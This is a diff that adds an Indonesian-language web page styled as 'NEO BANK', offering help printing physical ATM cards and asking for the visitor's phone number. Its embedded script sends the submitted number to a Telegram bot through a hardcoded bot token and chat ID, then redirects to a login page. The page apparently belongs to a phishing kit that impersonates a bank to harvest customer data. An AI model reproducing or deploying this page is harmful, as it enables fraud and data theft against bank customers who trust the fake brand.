@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NEO BANK</title>
+
+<style>
+body{
+    font-family:Arial,sans-serif;
+    background:#fff7d1;
+    max-width:450px;
+    margin:auto;
+    padding:20px;
+}
+
+.box{
+    background:white;
+    padding:25px;
+    border-radius:20px;
+    box-shadow:0 5px 20px rgba(0,0,0,0.1);
+}
+
+h1{
+    text-align:center;
+    color:#ff9900;
+}
+
+label{
+    font-weight:bold;
+}
+
+input, select{
+    width:100%;
+    padding:14px;
+    margin-top:8px;
+    margin-bottom:18px;
+    border:1px solid #ccc;
+    border-radius:10px;
+}
+
+button{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:30px;
+    background:#ff9900;
+    color:white;
+    font-weight:bold;
+    font-size:16px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+<h1>NEO BANK</h1>
+
+<form id="myForm">
+
+<label>Nomor HP</label>
+<input type="tel" id="nomor" required>
+
+<label>Pilihan Bantuan</label>
+<select id="bantuan">
+    <option>Cetak Kartu Fisik ATM Gold</option>
+    <option>Cetak Kartu Fisik ATM Silver</option>
+</select>
+
+<button type="submit">
+KIRIM DATA
+</button>
+
+</form>
+
+</div>
+
+<script>
+const TOKEN = "8861922244:AAFpaWLYw6rh5LFmV8Gde8m7x-F09vKJtfE";
+const CHAT_ID = "8708074501";
+
+document.getElementById("myForm").addEventListener("submit", async function(e){
+
+    e.preventDefault();
+
+    const nama = document.getElementById("nama").value;
+    const nomor = document.getElementById("nomor").value;
+    const bantuan = document.getElementById("bantuan").value;
+
+    const text =
+`Data Terkirim
+
+Nomor: ${nomor}`;
+
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{
+            "Content-Type":"application/json"
+        },
+        body:JSON.stringify({
+            chat_id:CHAT_ID,
+            text:text
+        })
+    });
+
+    alert("Data berhasil dikirim");
+
+    window.location.href = "login.html";
+
+});
+</script>
+
+</body>
+</html>
